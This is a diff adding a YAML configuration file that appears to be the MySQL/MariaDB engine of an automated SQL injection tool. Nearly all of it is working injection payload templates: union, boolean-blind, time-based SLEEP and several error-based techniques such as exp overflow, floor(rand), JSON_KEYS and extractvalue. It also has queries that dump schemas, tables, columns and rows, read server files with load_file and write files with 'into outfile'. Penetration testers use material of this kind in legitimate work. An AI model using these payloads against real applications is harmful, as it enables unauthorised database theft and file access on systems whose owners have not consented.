@@ -1,0 +1,473 @@
+vendor: ""
+resource: 
+ info: |
+   concat(
+       concat_ws(
+           ${ENCLOSE_VALUE_HEX},
+           version(),
+           database(),
+           user()
+       ),
+       ${TRAIL_HEX}
+   )
+ schema: 
+  database: |
+   select concat(
+       ifnull(
+           group_concat(
+               ${ENCLOSE_VALUE_HEX},
+               r,
+               ${SEPARATOR_QTE_HEX},
+               q,
+               ${ENCLOSE_VALUE_HEX}
+               order by r
+               separator ${SEPARATOR_CELL_HEX}
+           ),
+           ${TRAIL_HEX}
+       ),
+       ${TRAIL_HEX}
+   ) from (
+       select
+           cast(SCHEMA_NAME as char) r,
+           cast(count(TABLE_NAME) as char) q
+       from INFORMATION_SCHEMA.tables t
+       right join INFORMATION_SCHEMA.schemata s
+       on s.SCHEMA_NAME = t.table_schema
+       group by r
+       {limit}
+   ) x
+  table: |
+   select concat(
+       group_concat(
+           ${ENCLOSE_VALUE_HEX},
+           r,
+           ${SEPARATOR_QTE_HEX},
+           q,
+           ${ENCLOSE_VALUE_HEX}
+           order by r
+           separator ${SEPARATOR_CELL_HEX}
+       ),
+       ${TRAIL_HEX}
+   ) from (
+       select
+           cast(TABLE_NAME as char) r,
+           cast(ifnull(table_rows, 0x30) as char) q
+       from information_schema.tables
+       where TABLE_SCHEMA = 0x${DATABASE.HEX}
+       order by r
+       {limit}
+   ) x
+  column: |
+   select concat(
+       group_concat(
+           ${ENCLOSE_VALUE_HEX},
+           n,
+           ${SEPARATOR_QTE_HEX},
+           0,
+           ${ENCLOSE_VALUE_HEX}
+           order by n
+           separator ${SEPARATOR_CELL_HEX}
+       ),
+       ${TRAIL_HEX}
+   ) from (
+       select cast(COLUMN_NAME as char) n
+       from information_schema.columns
+       where TABLE_SCHEMA = 0x${DATABASE.HEX}
+       and TABLE_NAME = 0x${TABLE.HEX}
+       order by n
+       {limit}
+   ) x
+  row: 
+   query: |
+          select concat(
+              group_concat(
+                  ${ENCLOSE_VALUE_HEX},
+                  r,
+                  ${SEPARATOR_QTE_HEX},
+                  q,
+                  ${ENCLOSE_VALUE_HEX}
+                  order by r
+                  separator ${SEPARATOR_CELL_HEX}
+              ),
+              ${TRAIL_HEX}
+          ) from (
+              select
+                  cast(concat(${FIELDS}) as char) r,
+                  cast(count(*) as char) q
+              from `${DATABASE}`.`${TABLE}`
+              group by r
+              {limit}
+          ) x
+   fields: 
+    field: "trim(ifnull(`${FIELD}`, 0x00))"
+    concat: ",0x7f,"
+  limit: "limit ${LIMIT}, 65536"
+ zipped: 
+  database: |
+   select concat(
+       ${ENCLOSE_VALUE_HEX},
+       cast(SCHEMA_NAME as char),
+       '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}${TRAIL_SQL}'
+   )
+   from INFORMATION_SCHEMA.schemata
+   {limit}
+  table: |
+   select concat(
+       ${ENCLOSE_VALUE_HEX},
+       cast(TABLE_NAME as char),
+       '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}${TRAIL_SQL}'
+   )
+   from information_schema.tables
+   where TABLE_SCHEMA = 0x${DATABASE.HEX}
+   {limit}
+  column: |
+   select concat(
+       ${ENCLOSE_VALUE_HEX},
+       cast(COLUMN_NAME as char),
+       '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}${TRAIL_SQL}'
+   )
+   from information_schema.columns
+   where TABLE_SCHEMA = 0x${DATABASE.HEX}
+   and TABLE_NAME = 0x${TABLE.HEX}
+   {limit}
+  row: 
+   query: |
+          select concat(
+              ${ENCLOSE_VALUE_HEX},
+              cast(concat(${FIELDS}) as char),
+              '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}${TRAIL_SQL}'
+          )
+          from `${DATABASE}`.`${TABLE}`
+          {limit}
+   fields: 
+    field: "trim(ifnull(`${FIELD}`, 0x00))"
+    concat: ",0x7f,"
+  limit: "limit ${LIMIT}, 1"
+ dios: 
+  database: |
+   select concat(@:=0,(select count(*) from (
+       select concat(
+           ${ENCLOSE_VALUE_HEX},
+           cast(SCHEMA_NAME as char),
+           '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}'
+       ) a
+       from INFORMATION_SCHEMA.schemata
+   )x where @ :=concat(@,a) {limit}), @, '${TRAIL_SQL}')
+  table: |
+   select concat(@:=0,(select count(*) from (
+       select concat(
+           ${ENCLOSE_VALUE_HEX},
+           cast(TABLE_NAME as char),
+           '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}'
+       ) a
+       from information_schema.tables
+       where TABLE_SCHEMA = 0x${DATABASE.HEX}
+   )x where @ :=concat(@,a) {limit}), @, '${TRAIL_SQL}')
+  column: |
+   select concat(@:=0,(select count(*) from (
+       select concat(
+           ${ENCLOSE_VALUE_HEX},
+           cast(COLUMN_NAME as char),
+           '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}'
+       ) a
+       from information_schema.columns
+       where TABLE_SCHEMA = 0x${DATABASE.HEX}
+       and TABLE_NAME = 0x${TABLE.HEX}
+   )x where @ :=concat(@,a) {limit}), @, '${TRAIL_SQL}')
+  row:
+   query: |
+          select concat(@:=0,(select count(*) from (
+              select concat(
+                  ${ENCLOSE_VALUE_HEX},
+                  cast(concat(${FIELDS}) as char),
+                  '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${SEPARATOR_CELL_SQL}'
+              ) a
+              from `${DATABASE}`.`${TABLE}`
+          )x where @ :=concat(@,a) {limit}), @, '${TRAIL_SQL}')
+   fields: 
+    field: "trim(ifnull(`${FIELD}`, 0x00))"
+    concat: ",0x7f,"
+  limit: "limit ${LIMIT}, 1"
+ file: 
+  privilege: |
+   cast(
+       concat(
+           (
+               select if(count(*) = 1, 0x74727565, 0x66616c7365)
+               from INFORMATION_SCHEMA.USER_PRIVILEGES
+               where grantee = concat(0x27, replace(cast(current_user as char), 0x40, 0x274027), 0x27)
+               and PRIVILEGE_TYPE = 0x46494c45
+           ),
+           ${TRAIL_HEX}
+       )
+       as char
+   )
+  read: "cast(concat(load_file(0x${FILEPATH.HEX}), ${TRAIL_HEX}) as char)"
+  create: 
+   content: "(select 0x${CONTENT.HEX})"
+   query: "into outfile \"${FILEPATH}\""
+strategy: 
+ configuration: 
+  slidingWindow: |
+   (
+       select
+           concat(
+               ${LEAD_HEX},
+               mid(
+                   (${INJECTION}),
+                   ${INDEX},
+                   ${CAPACITY}
+               )
+           )
+   )
+  limit: "limit ${LIMIT}, 65536"
+  failsafe: "1337${INDICE}7330%2b1"
+  calibrator: "repeat(${CALIBRATOR_HEX}, 65536)"
+  limitBoundary: 0
+  endingComment: "--+-"
+  fingerprint: 
+   errorMessage: 
+    - "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near"
+    - MySQL
+    - "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near"
+    - MariaDB
+ normal: 
+  indices: "union select ${INDICES}"
+  capacity: |
+   (
+       select concat(
+           ${LEAD_HEX}, 
+           ${INDICE}, 
+           ${CALIBRATOR}
+       )
+   )
+  orderBy: "order by 1337"
+ boolean: 
+  test: 
+   falses: 
+    - "true = false"
+    - "true %21= true"
+    - "false %21= false"
+    - "1 = 2"
+    - "1 %21= 1"
+    - "2 %21= 2"
+   trues: 
+    - "true = true"
+    - "false = false"
+    - "true %21= false"
+    - "1 = 1"
+    - "2 = 2"
+    - "1 %21= 2"
+   initialization: "0%2b1 = 1"
+   bit: |
+    ascii(
+        substring(
+            ${INJECTION}, 
+            ${INDEX}, 
+            1
+        )
+    ) 
+    %26 ${BIT}
+   length: "char_length(${INJECTION}) > ${INDEX}"
+  blind: "and ${TEST}"
+  time: |
+   and if(
+       ${TEST}, 
+       1, 
+       SLEEP(${SLEEP_TIME})
+   )
+ error: 
+  method: 
+   - name: "BIGINT::exp"
+     query: |
+      and !(
+          select * 
+          from (
+              ${WINDOW}
+          ) x
+      )-~0
+     capacity: 64
+   - name: "BIGINT::exp in Order By"
+     query: |
+      1, (
+          select 1 
+          from (
+              select !(
+                  select * 
+                  from (
+                      ${WINDOW}
+                  ) x
+              )-~0
+          ) x
+      )
+     capacity: 64
+   - name: "BIGINT::exp in Delete Update Insert"
+     query: |
+      ' or (
+          select !(
+              select * 
+              from (
+                  ${WINDOW}
+              ) x
+          )-~0
+      ) or '"
+     capacity: 64
+   - name: "DOUBLE::exp"
+     query: |
+      and 1 = exp(
+          ~(
+              select * 
+              from (
+                  ${WINDOW}
+              ) x
+          )
+      )
+     capacity: 64
+   - name: "DOUBLE::exp in Order By"
+     query: |
+      1, (
+          select exp(
+              ~(
+                  select * 
+                  from (
+                      ${WINDOW}
+                  ) x
+              )
+          )
+      )
+     capacity: 64
+   - name: "DOUBLE::exp in Delete Update Insert"
+     query: |
+      ' or (
+          select exp(
+              ~(
+                  select * 
+                  from (
+                      ${WINDOW}
+                  ) x
+              )
+          )
+      ) or '
+     capacity: 64
+   - name: "GROUPBY::floor_rand"
+     query: |
+      or exists(
+          select
+              count(*),
+              concat(
+                  (${WINDOW}),
+                  floor(rand(0)*2)
+              )
+          from information_schema.tables
+          group by 2
+      )
+     capacity: 64
+   - name: "GROUPBY::floor_rand in Order By"
+     query: |
+      1, (
+          select 1 from (
+              select
+                  count(*),
+                  concat(
+                      (${WINDOW}),
+                      floor(rand(0)*2)
+                  )
+              from information_schema.tables
+              group by 2
+          ) x
+      )
+     capacity: 64
+   - name: "GROUPBY::floor_rand in Delete Insert Update"
+     query: |
+      ' or (
+          select 1 from (
+              select
+                  count(*),
+                  concat(
+                      (${WINDOW}),
+                      floor(rand(0)*2)
+                  )
+              from information_schema.tables
+              group by 2
+          ) x
+      ) or '
+     capacity: 64
+   - name: "JSON::json_keys"
+     query: |
+      /* Require FALSE statement, then OR */
+      and 1 = 0 or 1 = (
+          select JSON_KEYS (
+              (
+                  select * 
+                  from (
+                      ${WINDOW}
+                  ) x
+              )
+          )
+      )
+     capacity: 64
+   - name: "JSON::json_keys in Order By"
+     query: |
+      /* Require FALSE statement, then OR */
+      1, (
+          select JSON_KEYS (
+              (
+                  select * 
+                  from (
+                      ${WINDOW}
+                  ) x
+              )
+          )
+      )
+     capacity: 64
+   - name: "JSON::json_keys in Delete Insert Update"
+     query: |
+      ' or (
+          select JSON_KEYS (
+              (
+                  select * 
+                  from (
+                      ${WINDOW}
+                  ) x
+              )
+          )
+      ) or '
+     capacity: 64
+   - name: "XML::extractvalue"
+     query: |
+      and 1 = extractvalue(
+          0x0a, 
+          concat(
+              0x0a,
+              (${WINDOW})
+          )
+      )
+     capacity: 99
+   - name: "XML::extractvalue in Order By"
+     query: |
+      1, (
+          select 1 from (
+              select extractvalue(
+                  0x0a, 
+                  concat(
+                      0x0a, 
+                      (${WINDOW})
+                  )
+              )
+          ) x
+      )
+     capacity: 99
+   - name: "XML::extractvalue in Delete Insert Update"
+     query: |
+      ' or (
+          select 1 from (
+              select extractvalue(
+                  0x0a, 
+                  concat(
+                      0x0a, 
+                      (${WINDOW})
+                  )
+              )
+          ) x
+      ) or '
+     capacity: 99
